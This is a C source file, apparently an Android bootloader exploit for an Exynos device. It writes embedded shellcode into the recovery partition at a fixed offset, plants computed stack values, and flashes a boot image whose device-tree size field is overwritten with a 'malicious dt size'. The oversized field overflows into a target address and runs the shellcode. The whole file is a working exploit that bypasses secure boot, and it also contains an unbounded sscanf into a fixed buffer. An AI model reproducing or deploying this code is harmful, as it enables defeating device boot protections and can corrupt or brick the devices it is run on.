#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <sys/ioctl.h>
#include <fcntl.h>
#include <unistd.h>

#define BOOT_PATH		"/dev/block/sda8"
#define RECOVERY_PATH	"/dev/block/sda9"

#define BUF_ADDR		0x40204800 // Exynos BL scratch area
#define TARGET_ADDR		0x43E0B000

#define PATCH_OFFSET	0x1FFB800
#define PATCH_SIZE		0xB000

#define BOOTIMG_DATA	0x130 // where to put the correct stack data in shellcode

#define ROUND_TO_PAGE(x,y) (((x) + (y)) & (~(y)))

/* dat sh3llc0d3 */
extern const char _binary_patch_bin_size;
extern const char _binary_patch_bin_start;

struct {
	unsigned int bootimg_len; // total size of boot image
	unsigned int bootimg_addr; // total size of boot image + buffer address
	unsigned int bootimg_dt; // malicious dt size
} patch;

static int real_dt;

static int get_offsets(char *boot)
{
	uint32_t header[0x40] = {0};
	int page_mask;
	int kernel_actual, ramdisk_actual, dt_actual;
	unsigned int boot_img_size, boot_size_buf;
	unsigned int dt, target;
	int len;
	size_t result = 0;
	FILE *inf;

	inf = fopen(boot, "rb");
	if (!inf) {
		printf("Failed to open boot image\n");
		return -1;
	}

	fseek(inf, 0, SEEK_END);
	len = ftell(inf);
	rewind(inf);

	fread(header, 1, 0x40, inf);

	dt = header[10];

	real_dt = dt;

	page_mask = header[9] - 1;
	kernel_actual = ROUND_TO_PAGE(header[2], page_mask);
	ramdisk_actual = ROUND_TO_PAGE(header[4], page_mask);
	dt_actual = ROUND_TO_PAGE(header[10], page_mask);

	boot_img_size = 0x800 + 0x20 + kernel_actual + ramdisk_actual + dt_actual;
	boot_size_buf = BUF_ADDR + boot_img_size;

	target = TARGET_ADDR - boot_size_buf;

	target += 0x820 + dt;

	patch.bootimg_len = len;
	patch.bootimg_addr = boot_size_buf;
	patch.bootimg_dt = target;

	fclose(inf);
	return 0;
}
static int patch_bootloader(void)
{
	int ret = 0;
	FILE *recovery;

	recovery = fopen(RECOVERY_PATH, "wb");
	if (!recovery) {
		printf("Failed to open partition\n");
		return -1;
	}

	ret = fseek(recovery, PATCH_OFFSET, SEEK_SET);
	if (ret) {
		printf("Failed to set patch address\n");
		return -1;
	}
	fwrite(&_binary_patch_bin_start, 1, 0xB000, recovery);
	fsync(fileno(recovery));

	rewind(recovery);

	ret = fseek(recovery, PATCH_OFFSET+BOOTIMG_DATA, SEEK_SET);
	if (ret) {
		printf("Failed to set stack data\n");
		return -1;
	}

	fwrite(&patch.bootimg_len, sizeof(uint32_t), 1, recovery);

	ret = fseek(recovery, PATCH_OFFSET+BOOTIMG_DATA+4, SEEK_SET);
	if (ret) {
		printf("Failed to set stack data\n");
		return -1;
	}

	fwrite(&patch.bootimg_addr, sizeof(uint32_t), 1, recovery);

	ret = fseek(recovery, PATCH_OFFSET+BOOTIMG_DATA+8, SEEK_SET);
	if (ret) {
		printf("Failed to set stack data\n");
		return -1;
	}

	fwrite(&patch.bootimg_dt, sizeof(uint32_t), 1, recovery);

	fsync(fileno(recovery));
	fclose(recovery);

	return 0;
}

static int patch_boot(char *bootimg)
{
	int ret, result = 0;
	uint8_t *data = NULL;
	size_t size;
	FILE *boot, *img;

	img = fopen(bootimg, "rb");
	if (!img) {
		printf("Failed to open boot image\n");
		return -1;
	}

	boot = fopen(BOOT_PATH, "wb");
	if (!boot) {
		printf("Failed to open partition\n");
		return -1;
	}

	fseek(img, 0, SEEK_END);
	size = ftell(img);
	rewind(img);

	data = (uint8_t *)malloc(sizeof(uint8_t)*(size+2));
	if (!data) {
		printf("Failed to allocate buffer\n");
		fclose(img);
		return -1;
	}

	result = fread(data, 1, size, img);
	if (result != size) {
		printf("Failed to read file %s\n", bootimg);
		fclose(img);
		return -1;
	}

	fclose(img);

	fwrite(data, 1, size, boot);
	fseek(boot, 0x28, SEEK_SET);
	fwrite(&patch.bootimg_dt, 1, 0x4, boot);
	fsync(fileno(boot));
	fclose(boot);

	return 0;
}

int main(int argc, char *argv[])
{
	int ret = 0;
	char file[80] = {0};

	if (argc != 2) {
		printf("Need boot image\n");
		return 1;
	}

	sscanf(argv[1], "%s", file);

	get_offsets(file);
	patch_bootloader();
	patch_boot(file);

	return 0;
}

